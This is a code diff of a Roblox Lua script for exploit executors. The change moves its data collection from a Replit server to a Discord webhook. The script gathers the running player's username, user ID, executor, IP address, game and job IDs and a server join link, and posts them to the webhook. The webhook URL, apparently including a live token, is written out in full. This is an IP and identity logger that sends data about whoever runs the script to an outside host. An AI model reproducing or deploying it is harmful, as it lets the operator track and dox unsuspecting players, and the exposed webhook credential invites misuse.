@@ -2,7 +2,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
-local WEBHOOK_URL = "https://099ba264-091c-4240-862f-929a2d4cf6dc-00-tnnjm7ohtx9b.kirk.replit.dev/"  -- Your webhook URL (Delta-compatible)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1368281787347894342/9hd3IIwiiBZtVe27LwgrkxiVAh837qxDvvv7z4nws1Ggu995tn84SXdndYxsKlH88fPA"  -- Replace with your Discord webhook URL
 
 local player = Players.LocalPlayer
 local username = player.Name
@@ -39,18 +39,32 @@ pcall(function()
     gameName = MarketplaceService:GetProductInfo(placeId).Name
 end)
 
--- Payload to send to the Replit server
+-- Payload to send to Discord Webhook
 local payload = {
-    username = username,
-    userId = userId,
-    executor = executor,
-    ipAddress = ipAddress,
-    gameName = gameName,
-    placeId = tostring(placeId),
-    jobId = jobId,
-    joinLink = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId),
+    ["embeds"] = {{
+        ["title"] = "**🚨 Script Execution Log 🚨**",
+        ["color"] = tonumber(0xFFA500),
+        ["thumbnail"] = {
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+        },
+        ["fields"] = {
+            {["name"] = "👤 Username", ["value"] = username .. "  |  **" .. executor .. "**", ["inline"] = false},
+            {["name"] = "🆔 User ID", ["value"] = userId, ["inline"] = true},
+            {["name"] = "🌐 IP Address", ["value"] = ipAddress, ["inline"] = true},
+            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = false},
+            {["name"] = "🔑 Place ID", ["value"] = tostring(placeId), ["inline"] = true},
+            {["name"] = "📝 Job ID", ["value"] = jobId, ["inline"] = false},
+            {
+                ["name"] = "🔗 Join Link",
+                ["value"] = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId),
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {["text"] = "Made by Cat :3 🐱"}
+    }}
 }
 
+-- Send to Discord Webhook
 local request = http_request or request or syn and syn.request or http and http.request
 if request then
     local success, response = pcall(function()
@@ -65,7 +79,7 @@ if request then
     end)
     
     if success then
-        print("Data sent successfully to Replit!")
+        print("Data sent successfully to Discord!")
     else
         print("Error sending data: " .. tostring(response))
     end
